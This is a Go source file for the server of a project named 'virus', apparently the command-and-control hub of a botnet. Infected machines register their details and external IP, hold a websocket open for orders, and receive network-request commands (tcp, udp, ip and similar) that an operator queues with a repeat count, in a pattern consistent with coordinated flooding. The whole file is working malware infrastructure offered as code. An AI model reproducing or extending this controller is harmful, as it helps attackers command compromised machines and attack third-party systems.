package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"time"

	"github.com/go-chi/chi"
	"github.com/gorilla/websocket"
	"github.com/jessevdk/go-flags"
	"github.com/rs/zerolog/log"
	uuid "github.com/satori/go.uuid"

	"github.com/kolya59/virus/common/machine"
	"github.com/kolya59/virus/common/models"
	"github.com/kolya59/virus/common/pubsub"
)

var (
	publishTimeout = 5 * time.Second
)

type options struct {
	ProjectID         string `long:"projectID" env:"PROJECT_ID" required:"true" default:"trrp-virus"`
	DataTopicName     string `long:"dataTopicName" env:"DATA_TOPIC_NAME" required:"true" default:"machines"`
	DataSubName       string `long:"dataSubName" env:"DATA_SUB_NAME" required:"true" default:"machines-sub"`
	CommandsTopicName string `long:"commandsTopicName" env:"COMMANDS_TOPIC_NAME" required:"true" default:"machines-command"`
	CommandsSubName   string `long:"commandsSubName" env:"COMMANDS_SUB_NAME" required:"true" default:"machines-sub-command"`
	Port              string `long:"port" env:"PORT" required:"true" default:"8080"`
}

type service struct {
	dataClient     *pubsub.Client
	commandsClient *pubsub.Client
	commandsChan   chan commandWithId
	ack            map[string]chan models.WSAck
	upgrader       websocket.Upgrader
}

type commandWithId struct {
	id      string
	command models.WSCommand
}

// Save machine handler
func (s service) SaveMachine(w http.ResponseWriter, r *http.Request) {
	log.Info().Msg("Save machine")

	// Get body
	data, err := ioutil.ReadAll(r.Body)
	if err != nil {
		log.Error().Err(err).Msg("Failed to read msg")
		w.WriteHeader(http.StatusInternalServerError)
		return
	}

	// Get machine from body
	var m machine.Machine
	if err := json.Unmarshal(data, &m); err != nil {
		log.Error().Err(err).Msg("Failed to unmarshal msg")
		w.WriteHeader(http.StatusInternalServerError)
		return
	}

	// Bind external IP
	m.ExternalIP = r.RemoteAddr

	// Marshal machine
	data, err = json.Marshal(m)
	if err != nil {
		log.Error().Err(err).Msg("Failed to marshal machine")
		w.WriteHeader(http.StatusInternalServerError)
		return
	}

	// Publish raw bytes to pubsub
	ctx, cancel := context.WithTimeout(context.Background(), publishTimeout)
	defer cancel()
	if err := s.dataClient.Publish(ctx, data); err != nil {
		log.Error().Err(err).Msg("Failed to publish msg")
		w.WriteHeader(http.StatusUnprocessableEntity)
		return
	}
	w.WriteHeader(http.StatusOK)
}

// Subscribe to changes handler
func (s service) Subscribe(w http.ResponseWriter, r *http.Request) {
	log.Info().Msg("Subscribe")
	c, err := s.upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Error().Err(err).Msg("Failed to upgrade conn")
		w.WriteHeader(http.StatusInternalServerError)
		return
	}
	defer c.Close()

	cnt := 0
	for input := range s.commandsChan {
		cnt++
		log.Info().Msgf("Got %d msg for %v", cnt, r.RemoteAddr)
		if err := c.WriteJSON(input.command); err != nil {
			log.Error().Err(err).Msg("Failed to write json")
			return
		}

		var res models.WSAck
		if err := c.ReadJSON(&res); err != nil {
			log.Error().Err(err).Msg("Failed to read json")
			return
		}
		s.ack[input.id] <- res
	}
}

// Publish commands handler
func (s service) PublishCommand(w http.ResponseWriter, r *http.Request) {
	data, err := ioutil.ReadAll(r.Body)
	if err != nil {
		log.Error().Err(err).Msg("Failed to read msg")
		w.WriteHeader(http.StatusUnprocessableEntity)
		return
	}

	var msg models.WSCommand
	if err := json.Unmarshal(data, &msg); err != nil {
		log.Error().Err(err).Msg("Failed to unmarshal msg")
		w.WriteHeader(http.StatusUnprocessableEntity)
		return
	}

	switch msg.Type {
	case "tcp", "tcp4", "tcp6", "udp", "udp4", "udp6", "ip", "ip4", "ip6", "unix", "unixgram", "unixpacket":
		break
	default:
		log.Error().Err(err).Msg("Invalid type")
		w.Write([]byte("Invalid type"))
		w.WriteHeader(http.StatusUnprocessableEntity)
		return
	}

	log.Info().Msgf("Publish command: %v", msg)

	for i := 0; i < msg.Count; i++ {
		if err := s.commandsClient.Publish(context.Background(), data); err != nil {
			log.Error().Err(err).Msg("Failed to publish msg")
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
	}

	w.WriteHeader(http.StatusOK)
}

// Check server handler
func (s service) Check(w http.ResponseWriter, r *http.Request) {
	log.Info().Msg("Health check")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("OK"))
}

func main() {
	var opts options
	if _, err := flags.Parse(&opts); err != nil {
		log.Fatal().Err(err).Msg("Failed to initialize env")
	}

	// Initialize pub sub dataClient
	dataClient, err := pubsub.NewClient(opts.ProjectID, opts.DataTopicName, opts.DataSubName, 5*time.Second)
	if err != nil {
		log.Fatal().Err(err).Msg("Failed to initialize pubsub dataClient")
	}

	// Initialize pub sub commandsClient
	commandsClient, err := pubsub.NewClient(opts.ProjectID, opts.CommandsTopicName, opts.CommandsSubName, 2*time.Minute)
	if err != nil {
		log.Fatal().Err(err).Msg("Failed to initialize pubsub commandsClient")
	}

	s := service{
		dataClient:     dataClient,
		commandsClient: commandsClient,
		commandsChan:   make(chan commandWithId),
		ack:            make(map[string]chan models.WSAck),
		upgrader:       websocket.Upgrader{},
	}

	ctx := context.Background()
	go func() {
		if err := s.commandsClient.Consume(ctx, func(ctx context.Context, data []byte) (bool, error) {
			log.Info().Msgf("Got command: %s", data)
			var input models.WSCommand
			if err := json.Unmarshal(data, &input); err != nil {
				log.Error().Err(err).Msg("Failed to read input json")
				return false, err
			}
			id := uuid.NewV4().String()
			s.ack[id] = make(chan models.WSAck)
			s.commandsChan <- commandWithId{
				id:      id,
				command: input,
			}
			ack, ok := <-s.ack[id]
			if !ok {
				return false, nil
			}
			delete(s.ack, id)
			if ack.Err != "" {
				log.Error().Err(err).Msg("Failed to do requests")
				return false, err
			}

			return true, nil
		}); err != nil {
			log.Fatal().Msgf("Failed to consume: %v", err)
		}
	}()

	// Initialize server
	r := chi.NewRouter()
	r.Post("/machine", s.SaveMachine)
	r.Post("/command", s.PublishCommand)
	r.HandleFunc("/subscribe", s.Subscribe)
	r.Get("/health", s.Check)

	srv := http.Server{
		Addr:    fmt.Sprintf(":%v", opts.Port),
		Handler: r,
	}

	log.Info().Msg("Start to serve")
	if err := srv.ListenAndServe(); err != nil {
		log.Fatal().Err(err).Msg("Failed to listen and serve")
	}
}
